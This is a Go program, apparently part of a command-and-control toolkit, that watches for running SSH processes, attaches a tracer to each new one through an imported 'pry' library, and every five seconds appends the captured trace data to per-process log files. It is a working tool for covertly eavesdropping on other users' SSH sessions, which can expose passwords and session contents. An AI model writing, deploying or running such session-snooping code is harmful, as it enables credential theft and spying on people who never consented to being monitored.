package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/PatronC2/sshpry-go/pry"
)

func main() {
	fmt.Println("Monitoring SSH processes...")

	initialPids, err := pry.GetSSHProcesses()
	if err != nil {
		log.Fatalf("Failed to get initial SSH processes: %v", err)
	}

	seenPids := make(map[int]bool)
	for _, pid := range initialPids {
		seenPids[pid] = true
	}

	go func() {
		for {
			pry.CacheMu.Lock()
			for pid, builder := range pry.Caches {
				if builder.Len() == 0 {
					continue
				}

				filename := fmt.Sprintf("trace_pid%d.log", pid)
				f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err != nil {
					log.Printf("Failed to open file for PID %d: %v", pid, err)
					continue
				}

				if _, err := f.WriteString(builder.String()); err != nil {
					log.Printf("Failed to write to file for PID %d: %v", pid, err)
				}
				builder.Reset()
				f.Close()
			}
			pry.CacheMu.Unlock()

			time.Sleep(5 * time.Second)
		}
	}()

	for {
		sshPids, err := pry.GetSSHProcesses()
		if err != nil {
			log.Printf("Error fetching SSH processes: %v", err)
			time.Sleep(2 * time.Second)
			continue
		}

		for _, pid := range sshPids {
			if !seenPids[pid] {
				go pry.StartTracing(pid)
				seenPids[pid] = true
			}
		}

		time.Sleep(2 * time.Second)
	}
}
